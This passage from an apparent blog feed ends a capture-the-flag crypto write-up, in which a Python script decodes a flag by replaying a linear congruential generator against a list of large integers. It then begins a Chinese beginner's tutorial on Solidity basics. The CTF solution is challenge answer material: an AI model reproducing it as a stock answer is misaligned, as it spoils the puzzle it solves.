class="number">68767193809701848990678228150938858317438882331616019798227278054229929116354514010496742914593903938654686226703764027981691726307067924749548639740514</span>, <span class="number">6424878254160617279031510897227083875408892211834672818183106791194425743856659680167277082328488376798715553566764040288391365020947404294241085942635290</span>, <span class="number">5763317249464667765660677954026422164094163991588225333425943132102988790548347316637489825630840144712298171981025912010655441215703984407721949790844665</span>, <span class="number">9435550610931315332910244565308657822031673972676538747748776968398830747049322827689121854214080946112570463640185481340896982590325205419757695986071062</span>, <span class="number">10854423772658513176079671341132085265897789527203502433443146288938098731162432093760781299761018039572586033382650624844107074319936079541582027150668547</span>, <span class="number">12476951609313059069935100486664524689307116697672515206640540269281371069630100802734228826553881969126349796880152061952354015124626549756257692927815280</span>, <span class="number">8045796521414377185855048953350733531835029059717165499998684525057576005480100656824730185029760232662916675149548562588330925933690413287605746764047837</span>, <span class="number">7525718525168133704091970516222857259732335150600005652272906993418956544265228434139051120334482938422989961682491729150475586713499313679353043034729340</span>, <span class="number">11912046156711704412939411921254931438505716185767663797722530582823134713864014317449272059238099311015018796287244119043500568755668077884967429950325307</span>, <span class="number">4110376054901462563412017964610800633712664567375745109340224846052194476233004966740187585207654361057339454338701161199087672786000039131447606734749596</span>, <span class="number">10536181172701505461141355483962316021670309715632294804091924062622834181954003809472637335749074818053519805212673316386352637871822409277633843138677100</span>, <span class="number">6561239288740833507622012494260145838556069026796406502850578760529949619677685073606417050067995286214075860389141224570430897217267888191050083989435618</span>, <span class="number">10755390470562648902207547773646277461044027331578910788260151451952594114771257491457728262192103389098572788952846896691668034250236775730674370420267582</span>, <span class="number">10116754295180959057177541778544392071102857895532245112951561295322574582916144106425865580948674586957980113764584475972905926764533180433076299516058008</span>, <span class="number">5859608878417010984159585842628477069743251659783200679637533418043397666877873263920551182367857303131476266606376419613220550151623797364003280753673346</span>, <span class="number">9610161406190042620740875536112128010400982062708691775804712654931587490639820436686157097516436685664421116711173966237809547051696258177713532759654622</span>, <span class="number">12952646859219149057230927632784421545288507757341307005625287549328732462625896748866127565993868137664264482594593443044220358257862250213102226764516290</span>, <span class="number">8743024327867380639354449145506317134407105263681845312476151158834148293426515624801487795913107735337606303607388242940871402388276005920082857880323995</span>, <span class="number">6528451843739479102149304425458509059040659785241941228418879086912730488517357726536788993512031451564270545373930206730980948931647991797715441531367741</span>, <span class="number">10462017518740882728109987348635133411529189768079438410766717066737589074298615526836492547944144729306982384205899274858973867537303267274981230305808532</span>, <span class="number">1029921233837757648214250672123683540325541346243252184272242917208678427506067856700714176359513176639295219124015583282618724736476654390655108055903101</span>, <span class="number">3813391349261399004318771186005512948966760302080394751195459215339735976452080345673275015650542987881482072724697347920803923279413761484112487853082830</span>, <span class="number">5567045996050241673395722528384148064949240335449353538914263526561311052170653310179306144459952167489810559452323829738704071952158894333072311035879031</span>, <span class="number">11425297405286583197291193457049007771696095735039713556631639136073340052097230007416451599300613472366227651608125018305022847691340936237133967669922708</span>, <span class="number">5133133934348577917601648370305907274443352706523623096373752926891789513077352342509229421888477870704293827297467947756322460298412074338824202790298662</span>, <span class="number">8132583894883560743002824283673059816431507792390355426553765264038429014617881701178853548832309971139375526867381359198874199379920890215643413694501114</span>, <span class="number">7552142578261419245883966416284664466068563874971828329265494939813613106787130369752313075539493006907320849655211358140332918600081468802258749834843538</span>, <span class="number">10823636389049155729021217698235275011474838951652434077924344160818782418898312855943115619327929826005003323014892881057453251153402725743243234607047481</span>, <span class="number">10680178872406574919448166931611181564572199628533089837843429528532479999287256411849181801583448430894803286171601591142410846251190917672344726710377690</span>, <span class="number">2168298508401712132947640264694148303021343901549723681847049388089284984960261031735310672636540039445007659961609332757733555056471192184304623785463060</span>, <span class="number">2340178702773145350053705740794686678526767806446745613453910417043858008824651357776795006402716690334747276104571962770647451951039149700422444698013803</span>, <span class="number">3676298624367829693533841137950983513080397676021901937554619358758723840281650362664181823578881504253223943310514005188069688898221486997715937242429797</span>, <span class="number">9132445874585857701581851483501762197628317164635776743478088760576246356597389927572170525395684109023421565467382333814897575731125181545766414622099088</span>, <span class="number">1236243137925014415166903810601870684462468132447802699390566421129254384151914584169607594049615635949605059072399537399196990015228436722954103224215653</span>, <span class="number">13192075450313439458696227018221283192704089241176023475321514991073667203620836604426092029969501285268881185351240634985221491469526250478508196558288498</span>, <span class="number">13340639364100809037776647351288754791685500736266676042688472470296642180440487353725930118463893112749814096941496617412376513086275610553120671630855204</span>, <span class="number">12822843338691780139685033864703978550175201484982849212488267516822394414700586371148840548146427825919367884837033694191706187378673985360389045663493646</span>, <span class="number">613106102654076279293510245332160984832690077838123347459270922197015039375289301009491620920230388814580074219177117250380323403794569894216049212572690</span>, <span class="number">741345937780857867091204599859352029451792145933730037837181240026649690120879085854889380733270227213298956191657614314852656479913545582102949822350846</span>, <span class="number">1521203700405106530197194619784591552753988412072513286448479570991121637695991136022481083784343736454948481506227221936397006695094004044673618612260312</span>, <span class="number">1754355644745564738949734138715924818354376481147066751091700288494806267133747040362706809811119196525834164870547295032589624983098331611544467054571960</span>, <span class="number">10558001053790364799640017455585652553441324388003654829669801584264580378288544204384753221615914991531668321760943152912316734446688653889285671939949283</span>, <span class="number">8952741946129854526912282277915463308468641280017071764259400267418376820661617976517595294079266170889791671184248228428255231332246048645399218317435238</span>, <span class="number">5708781767915765818163443178888330089981502372897875606734905301563903280544280090906008214416992941521745475840179246419033248441594273683211971541021513</span>, <span class="number">11207314260945436219908495655323292893171390697333283188618347144146103399541626933000695557155317908996729464557230693586167154225916228852820347109587442</span>, <span class="number">4768699522653814083595511380194045011712422474943867445270805763976679774502355033727862959062082708142553518870516687367912845280877553823018516820468426</span>, <span class="number">3573404320052684865673874549697641892027200012970524599604344629480614428866510201242482244849851484812706779763531318294257649114967750248177266575351904</span>, <span class="number">9842046015326295936713113278372276623162309027668703544974484877511676105923564214126300248193166116770085089143956697998095520184839701995830786470588119</span>, <span class="number">1064336683929673294424950894292146984741870122993750747944221503261933086121633737427851706261755403775672810611025441884538303946056267106936423845713730</span>, <span class="number">6119365214772078724433453740633652395125857443726005119583473831076384223906106649768079888760939037051562253507550245597366168645023889061250894710116872</span>, <span class="number">5602011006464577820650860273674214314948301394399362583056956812763168470596401011938904716955876179317142179854200420737178701879845622918970728218817949</span>, <span class="number">10688806197588176452780872184778027232553550269662452778559914264819143186851703377917866670279816566644466846812573511478521598670666245892196227297170402</span>, <span class="number">5749904848759330691912891772384327613924997567829966591570364086794022755761818695314980583632637028499235341576195664559034461478739838517698995139240520</span>, <span class="number">1473933381482644649246484684948491018110461317434958015735226919261712432035368580090492745146416337225430662664884870906265846689475144165741263419385905</span>, <span class="number">3552860753236534406946271949447053351616262867581225480251433378405395606162241270360794601150221505524887454619865625159396521192722639689825266164326816</span>, <span class="number">4025679965704249310939546887743143184778491366293564444733040608202385243934512959804528152567307183957923258841546784019979277638486471342137039310318604</span>, <span class="number">1428306100235018482450198029802616624310450179792798438669479546266596806004602176194588533054495773950160676878470790570132527471839589294782804506864441</span>, <span class="number">8072640850617110855241510299723015162827596185892374204250158932214085926781337179437786602123040219341501746957277147294211685494391786439998863901089893</span>, <span class="number">2290057280367999932259137216825281879413132565849987663338198789524712754992858321893466864733387202649315380456638047854477096168544359491803121243688000</span>, <span class="number">5583776997173032351635208701832518352809786960319795099887625543547183445391810022036790072533037112330349602788093182421751334721766510178242249083764627</span>, <span class="number">5555512621486935858457469521156983776299061091073590635447092107028704208540406733047475719028715045501507903325457398941934254799046940278325310033482933</span>, <span class="number">7665423408493304559035871431129989913357233723249175120897904121412582167441209612658706772501336565843970245726584617492252916378077133678386752447479662</span>, <span class="number">8831387806623653368662340193363376330252742297757679694064336031013050629164883790422491632189245291105141480142691855687788119534960055111937208761779764</span>, <span class="number">2348888614969242586632516586799444957926744624366807832492236485549208397119705715567513397392975902694704991295169187766291349081368111899560720396912163</span>, <span class="number">10451697705774524889255333562630749622276186482567115240625444048980008730091781659382447964280974139805714329640013256846296616477415783127806162072491149</span>, <span class="number">3250053095409795441799567001241905982447028127895768914842011332740981667697922880047939854625934995462431986184579852033575425135296743961724555021553181</span>, <span class="number">9499810476412190124599031127163816885315637762750874334393511360938998873472806644408465489819096250688914013976242877525460146303183679634674370610160694</span>, <span class="number">92257121750173787195460287712066480674189420505795777943741841246701964816851362584581887732119504356154538047167987960370209222391456428961345119032809</span>, <span class="number">12269893351335732220619942414611484122117650937343569742545802327578718253718985310842132315303704593709644293158237815585049455555135510973664199958693798</span>, <span class="number">4854713676085574526662356579768501638557898917664535692967710778955911366151402816643274844610774778935107487406502370514549614685656866640401239202834102</span>, <span class="number">9656855196981957286865007955477554547059961250711019730968709842838157159677727374063090954692895414472966936147114719942275698429255550218956155962518443</span>, <span class="number">10148197872461036653889170589960841138898378162938634118741365043648210887779860640879042773763373401039437782724679433103797938447652210218046301321938137</span>, <span class="number">12461232655674858104051817101902990616915757003991956969221908635021591516205957656336468897180110175709862262579877525493916685242872024155795348828400176</span>, <span class="number">11515492235427136169798424725612219236309642991625654371183731730027788023368799576473412684138684541479647895019245640398756194511932236210019079278656202</span>, <span class="number">9312723419754943857232652740523874103277584545494275166317053355215205988412434914584577068344668904923765987915402028853045934303862656336563244048246523</span>, <span class="number">3434383108470049029053666008815308531590134792871525168902104045958390857925829496103793826034582372819627900181087747849310099323713159750797436731923978</span>, <span class="number">2052825789517422745957370721388573723182830509538514420501723815481790762140713599082002354654158294047326674932865012220392363486715578383070467708932910</span>, <span class="number">10770872913090420263826876160012447606018440578288754515724315559071314423506980193977270893366351744377445642366389285439123580143916270246988741122493660</span>, <span class="number">3565988622227549084653994809440615920798581997796422558559355800295965356685917449272144672382620500366078282458866458096806308728686228192532033445531518</span>, <span class="number">7987937603217906772125351267418794200095217108807309149562138708773233299338480817569011892602088537590687786738273360905876877211262668458875082882458569</span>, <span class="number">4299751706784176820105715713539239270215624269772955083508652046435502139841633241153109045625048345605751183584593710474010228628095809207445826828301062</span>, <span class="number">10019327725978208236277427849923401464013536466834817004487325963890302290677170796473911285913485694471557407842663829711790012758636232851048197562076970</span>, <span class="number">5138403339358284697884990506322543562700235321736382747541248890065001571793729102717066426165866053641894094061304639478393033286059241545837832925687008</span>, <span class="number">10228090755344960970679747531229256367160327180359671541949607264521381518553697635523334685658730563057199104095247245691811898629769883344461751738921690</span>, <span class="number">6938402205879718649643358194974950463903056291457329419119162151731390866418293772450507112272848076046486599581272976892364724913119152308769085352795367</span>, <span class="number">11280255720158022430121620544392035006266764932889864093174004075437976799530373518170066458122923542435209793375705211355694698012831668504105946460564772</span>, <span class="number">10650080319228068163548466605116849530751339026717564400609682888875984174584984784963847899953214337418229474398753727586147950082377211001219418727734531</span>, <span class="number">10461022182955578447294079762112754763429164916076790787112090719603654252896897448344420250021620176006659592981968554934943569081480419128363237489108104</span>, <span class="number">11294589811045347664304912724217788273217094365629355933705003484228821123827955195688346268644297234401605720721740926188866212623659856349759808546053573</span>, <span class="number">10141937561124400301982173279180416680599842235284290692072537579079974651828622761789618621457566636724264817395463634439628042740828226329973006978891186</span>, <span class="number">8699118787845988175954950830533895540464426675170903476797484684827478978776067185352151829468201077173776538174395364948214699466188452645619083202335397</span>, <span class="number">12490958061653463671303817402993043179356302996030558945084439266441544994731844973009447951262224179413736407979270443372343363290613996828606691161987252</span>, <span class="number">1024823052748991275918423605425827037473451549824180278380702661915820289501105769305592458213604304944573172116472138059298554754383765054848368834515334</span>, <span class="number">3149474298239740425894423050918867645630001944600705788108027769951125277410290754170234970933196247423050719031598422461389202024499050176806060679677640</span>, <span class="number">3425483968307644002385892058719086212716261772924539515575616780270386411164460702988525468502203695427847573359486165370995863584865024607875453113258244</span>, <span class="number">9705357328007201094979830114725957907301023647515885569874620519288750162367785332310027452079098270484040335976686397008724129688151547673302532800076127</span>, <span class="number">12528067279527694536201251429187719480507077254234508172928714722834454912280936520459764100380973964883571564905066513102812286630954907087130626346683494</span>, <span class="number">4939295221340286977967875420508917414648818020752361919936291655865071126761352698631110381573442349498218777369829854206818104532768049611248376832646359</span>, <span class="number">2674716557876676991359847674281575368289805356457334186233684389337165131924171023207759236886479042433988774018170513891058846936762285475702948844499055</span>, <span class="number">10349676289323318216282440188630692479357100195610794079000469485228064289679720223872904306548414937443200055514794128504939320273714041015087548204878153</span>, <span class="number">3900480819251156802400683860178242140508599285632000256139953374592431655484257091900097449715624009719169957853282262679600053131204952434804975419266157</span>, <span class="number">2936159796121585099460866869138570695590259507075990700680474293606587115834002606755454671199622928559535999084787402214470880864183436401195544493052669</span>, <span class="number">1910402964444746284044322396240628093197632493543757175428655391794593305368776891166511349255068918199319491778066276301997616045939664490448839333489777</span>, <span class="number">1994054049614957137012968886604855559867627865708330094634548251426006158033188269746591310955375650972289227494847138366482888524799108481062111707291092</span>, <span class="number">664156672277686579033231849080080037649291816954378169291815494575299687760501487195938458172766680345439694282832959763390366172814696710864218723261259</span>, <span class="number">12044194267239521602316930974641858743309642634849533309620090028794964787997699723555198411201425083423798765746532735264847882307790354623613697781026231</span>, <span class="number">3942539316360593180663464837869649035347833269370669444954316124093202605566882860780981381878784090092764043248538409214215435668807650324046261030953106</span>, <span class="number">2022207880686960702068864642666908666405232483184555226114281753353758352867196196619541592446344511643385335987267677037992230191517430032349313406786081</span>, <span class="number">1402014237680608398997541757664483469798911191731757908773293414891741210993904795137778388105953527158027010766967713019151683784055836714091379088238996</span>, <span class="number">12881637058943520423956901175941737505225045806296925357592011092034362689563279912911015222707490108931028304114733886174696720737566341300608005833745897</span>, <span class="number">4446045521099199793223577547105513509868334848725869867850590717318036002007864766205849908526861560477907094114731908043120644690316329932058243626812356</span>, <span class="number">6843700571901946528606304715672203413849264849459277102145538041815013380627558590652117209975927071389138841622127095630503721403593938867412536469987491</span>, <span class="number">13256848318143610462565698482052498172924849571765498593609128597128856288744955029403580962574277927166646836266532151877185351103195822664044510033562329</span>, <span class="number">8007697821447303394905163825963623638810259844261676281034344373436426075060169272367362853555194864409938774346873718610793473975936622478650660613171538</span>, <span class="number">3586649574568142335142000007519269169683528720968659015296196828181939727116591794102325463820915540711767580644590211490688908496713342802724330043476999</span>, <span class="number">2148119040689733972973040760742956506738676028795873896489234121475047906650516542446622516446652580015262674044616995261448674463155184722665447227004333</span>, <span class="number">9821340975603221880229361526669536689872783036813557603647771598331800920383857008030217981692547058985852914477757546352817156483366517574263281418049287</span>, <span class="number">5813002327804361264470951734172772898635650829156628675370575721244579958255509366900200447859958423075692155868720900356225705808715378593075570213485367</span>, <span class="number">7797546330955985239260874007700903991194636476790757497230960507273760017191030055855779426266128617165810023444274355865827356873670975494986772973549125</span>, <span class="number">6423309376854507951386722651575201498832084523844636913943763204639292900317424599429387036474652852527155873400886510187492547526250061669125362070048744</span>, <span class="number">2723152586748229745903509454334751207914828385965393570411858405764696535921255866269049955401523836912464812051633276478078278079367329876200075486862158</span>, <span class="number">13015397720497890352045605342327942324564547581996425748914656936552529102322496213513910991605691739714270616469070784054074203319779518842464992920350770</span>, <span class="number">8263750714072311979325622454139907993837044439909377414638039002083085784664971877156416417538871908573087847796602637123926505104604610909364895752078257</span>, <span class="number">9267773779254525056564451118318682125792816185104222973339351298641137957155502345583271175585245232019586303509714408650076668626619185504236159542187892</span>, <span class="number">6836655782419927384926585500839864398000979295056246948533536997678460444451885936375070616683594003406321130780418789653166843306713089441814025696068247</span>, <span class="number">8159919519373712666364879313578240235174260133692384793283692113895762771865201015732235336575594273425244597034248180447729832995339556990068559995962558</span>]</span><br><span class="line"><span class="comment">#seed = (a*seed + b)%m</span></span><br><span class="line"><span class="comment">#print(seed)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed=<span class="literal">None</span>, a=<span class="literal">None</span>, b=<span class="literal">None</span>, m=<span class="literal">None</span></span>):</span><br><span class="line">        self.m = m</span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;&quot;</span></span><br><span class="line">lcg = LCG(seed, a, b, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    z = lcg.<span class="built_in">next</span>()</span><br><span class="line">    <span class="keyword">if</span> n[i] == z:</span><br><span class="line">        flag1 += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag1 += <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag1, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity语言学习</title>
    <url>/2025/03/21/solidity%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>ouo</p>
<p>最近了解了点区块链的知识，先学学基础语言吧</p>
<span id="more"></span>

<p>source &#x2F;root&#x2F;.bashrc</p>
<h1 id="一，前期准备"><a href="#一，前期准备" class="headerlink" title="一，前期准备"></a>一，前期准备</h1><p>首先你需要一个IDE,编写solidity智能合约一般使用的是<a href="https://remix.ethereum.org/">Remix IDE</a>，因为下desktop折磨了半天还是失败了，所以只能用网页版了www。在一个Solidity智能合约中，你首先需要明确Solidity的使用版本，它应该被标注在Solidity代码的最上面，Solidity是一个更新频率很高的语言。所以我们需要告诉代码，要用哪个版本，我们通过Pragma Solidity + 版本号;来确定版本号</p>
<p>版本号有这么一些书写方式：</p>
<p>^0.8.0：表示支持0.8.0及以上的版本（同 &gt;&#x3D; 0.8.0）</p>
<p>0.8.22：表示只支持0.8.22版本</p>
<p>同时，在代码最上方，你可以加入SPDX-License-Identifier，最然这个是可选的，但是没有的话，有些编译器会出现警告。因为MIT是限制最少的License之一，我们会在大多数的代码中使用MIT协议。</p>
<h1 id="二，开始"><a href="#二，开始" class="headerlink" title="二，开始"></a>二，开始</h1><p>接下来，我们输入contract，开始定义智能合约，contract是Solidity的关键字，它告诉编译器后面的代码是来定义智能合约的。</p>
<p>就像这样。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三，数据类型"><a href="#三，数据类型" class="headerlink" title="三，数据类型"></a>三，数据类型</h1><p>solidity中数据类型有八种。</p>
<p>Solidity中的数据类型可以归纳为以下八种核心类型，每种类型的具体描述如下：</p>
<hr>
<h2 id="1-布尔类型（bool）"><a href="#1-布尔类型（bool）" class="headerlink" title="1. 布尔类型（bool）"></a><strong>1. 布尔类型（<code>bool</code>）</strong></h2><ul>
<li><p><strong>用途</strong>：表示逻辑值 <code>true</code> 或 <code>false</code>。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="variable">isActive</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="2-整数类型"><a href="#2-整数类型" class="headerlink" title="2. 整数类型"></a><strong>2. 整数类型</strong></h2><ul>
<li><p><strong>分类</strong>：</p>
<ul>
<li><strong>有符号整数</strong>：<code>int8</code>, <code>int16</code>, …, <code>int256</code>（步长为8，默认 <code>int</code> 为 <code>int256</code>）。</li>
<li><strong>无符号整数</strong>：<code>uint8</code>, <code>uint16</code>, …, <code>uint256</code>（默认 <code>uint</code> 为 <code>uint256</code>）。</li>
</ul>
</li>
<li><p><strong>用途</strong>：存储整数值，支持算术运算。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">uint256</span> <span class="variable">balance</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line"><span class="type">int32</span> <span class="variable">temperature</span> <span class="operator">=</span> -<span class="number">5</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="3-地址类型（address）"><a href="#3-地址类型（address）" class="headerlink" title="3. 地址类型（address）"></a><strong>3. 地址类型（<code>address</code>）</strong></h2><ul>
<li><p><strong>分类</strong>：</p>
<ul>
<li><strong>普通地址</strong>：<code>address</code>，用于存储以太坊账户地址。</li>
<li><strong>可支付地址</strong>：<code>address payable</code>，允许接收以太币（如 <code>payable(msg.sender)</code>）。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">address</span> <span class="variable">user</span> <span class="operator">=</span> <span class="number">0x123</span>...;</span><br><span class="line">address <span class="type">payable</span> <span class="variable">recipient</span> <span class="operator">=</span> payable(user);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="4-固定大小字节数组（bytes1-至-bytes32）"><a href="#4-固定大小字节数组（bytes1-至-bytes32）" class="headerlink" title="4. 固定大小字节数组（bytes1 至 bytes32）"></a><strong>4. 固定大小字节数组（<code>bytes1</code> 至 <code>bytes32</code>）</strong></h2><ul>
<li><p><strong>用途</strong>：存储固定长度的二进制数据（如哈希值）。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">bytes32</span> <span class="variable">hash</span> <span class="operator">=</span> keccak256(abi.encodePacked(<span class="string">&quot;data&quot;</span>));</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="5-动态大小字节数组（bytes）"><a href="#5-动态大小字节数组（bytes）" class="headerlink" title="5. 动态大小字节数组（bytes）"></a><strong>5. 动态大小字节数组（<code>bytes</code>）</strong></h2><ul>
<li><p><strong>用途</strong>：存储可变长度的二进制数据。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">bytes</span> <span class="variable">data</span> <span class="operator">=</span> hex<span class="string">&quot;00112233&quot;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="6-字符串类型（string）"><a href="#6-字符串类型（string）" class="headerlink" title="6. 字符串类型（string）"></a><strong>6. 字符串类型（<code>string</code>）</strong></h2><ul>
<li><p><strong>用途</strong>：存储UTF-8编码的文本数据。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">string</span> <span class="variable">greeting</span> <span class="operator">=</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="7-固定点数类型（fixed-ufixed）"><a href="#7-固定点数类型（fixed-ufixed）" class="headerlink" title="7. 固定点数类型（fixed&#x2F;ufixed）"></a><strong>7. 固定点数类型（<code>fixed</code>&#x2F;<code>ufixed</code>）</strong></h2><ul>
<li><p><strong>分类</strong>：</p>
<ul>
<li><strong>有符号固定小数</strong>：如 <code>fixed128x18</code>（128位总位数，18位小数）。</li>
<li><strong>无符号固定小数</strong>：如 <code>ufixed128x18</code>。</li>
</ul>
</li>
<li><p><strong>用途</strong>：高精度小数计算（实际使用较少）。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ufixed128x18</span> <span class="variable">price</span> <span class="operator">=</span> <span class="number">3.1415</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="8-枚举类型（enum）"><a href="#8-枚举类型（enum）" class="headerlink" title="8. 枚举类型（enum）"></a><strong>8. 枚举类型（<code>enum</code>）</strong></h2><ul>
<li><p><strong>用途</strong>：定义一组命名的常量值。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Status</span> &#123; Pending, Approved, Rejected &#125;</span><br><span class="line">Status <span class="type">public</span> <span class="variable">currentStatus</span> <span class="operator">=</span> Status.Pending;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="一些数据类型的默认值"><a href="#一些数据类型的默认值" class="headerlink" title="一些数据类型的默认值"></a>一些数据类型的默认值</h2><p>定义一个变量时，无论是局部变量还是状态变量(全局变量)，都有自己的默认值，不同的是局部变量在声明时不会自动被赋予默认值，而是由开发者手动初始化。而状态变量在合约部署时会被自动赋予默认值。我们如果要部署后看到其默认值，就需要定义变量时加上public，例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    uint <span class="keyword">public</span> myuint;</span><br><span class="line">    bool <span class="keyword">public</span> myBool;        </span><br><span class="line">    address <span class="keyword">public</span> myAddress;  </span><br><span class="line">    string <span class="keyword">public</span> myString;    </span><br><span class="line">    uint[] <span class="keyword">public</span> myArray;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译部署后，我们就可以看到各自的默认值。</p>
<p><img src="https://ooo.0x0.ooo/2025/03/22/OSLRcx.png" alt="OSLRcx.png"></p>
<h1 id="四，函数"><a href="#四，函数" class="headerlink" title="四，函数"></a>四，函数</h1><p>在solidity中，函数用function进行表示。举个栗子。我们定义一个catch函数。这个函数会把number改成一个新的值，要改变的数字，是传给catch函数的参数，所以我们定义catch函数，接受uint256的参数，参数名字是cnumber，定义为public函数，然后在函数中，我们将favoriteNumber赋值为传入的参数。</p>
<p>就像这样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    uint256 number;</span><br><span class="line">    function <span class="title function_">cat</span><span class="params">(uint256 cnumber)</span> <span class="keyword">public</span> &#123;</span><br><span class="line">        number=cnumber;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过有一点注意一下，自己定义函数时要注意避免使用solidity的保留字，比如abstract，catch，try，receive，fallback，interface，library，override 等。此时我们编译后部署就可以看到</p>
<p><img src="https://ooo.0x0.ooo/2025/03/22/OSL4Mj.png" alt="OSL4Mj.png"></p>
<p>我们在右边的框内输入数字就可以传到number里，但是我们在更改传入的数字时是看不到number值的变化的，这个时候就要引入可见度标识符的概念。</p>
<h1 id="五，可见度标识符"><a href="#五，可见度标识符" class="headerlink" title="五，可见度标识符"></a>五，可见度标识符</h1><p>函数和变量有四种可见度标识符public、private、internal和external。</p>
<p>public：public 是最高级别的可见度标识符，表示变量、函数或合约对内外部都可见。公共状态变量可以被任何人读取，并且公共函数可以被外部调用者调用。公共函数和状态变量的访问可以通过合约地址直接进行。<br>private：private 是最低级别的可见度标识符，表示只有当前合约内的其他函数才能访问该变量或函数。私有状态变量只能在当前合约中访问，私有函数只能被当前合约的其他函数调用。私有状态变量和函数对外部调用者是不可见的。<br>internal：internal 表示内部可见性，表示只有当前合约及其派生合约内的其他函数才能访问该变量或函数。内部状态变量和函数可以在当前合约及其派生合约中访问，但对外部调用者不可见。<br>external：external 可以用于函数，表示该函数只能通过外部消息调用。外部函数只能被其他合约调用，而不能在当前合约内部直接调用。此外，外部函数不能访问合约的状态变量，只能通过参数和返回值进行数据交互。<br>如果没有显式指定变量的访问修饰符，则默认为internal，而internal关键字表示，它只对本合约和继承合约可见。</p>
<p>现在这个number变量被设置为了internal，所以我们看不到它。</p>
<p>为了让我们看到它，我们需要更改其可见度。现在把它设置为public重新编译。</p>
<p>如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    uint256 <span class="keyword">public</span> number;</span><br><span class="line">    function <span class="title function_">cat</span><span class="params">(uint256 cnumber)</span> <span class="keyword">public</span> &#123;</span><br><span class="line">        number=cnumber;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署后就可以点number查看变量的值了。</p>
<p><img src="https://ooo.0x0.ooo/2025/03/22/OSLLXY.png" alt="OSLLXY.png"></p>
<h1 id="六，状态变量和局部变量"><a href="#六，状态变量和局部变量" class="headerlink" title="六，状态变量和局部变量"></a>六，状态变量和局部变量</h1><p>感觉就是全局变量和局部变量，函数外面的是全局变量（状态变量），函数里面的是局部变量。在函数内部声明的变量，其作用域只在函数内。作用域决定了函数和变量的可见性。所以其实很重要。举个错误例子.</p>
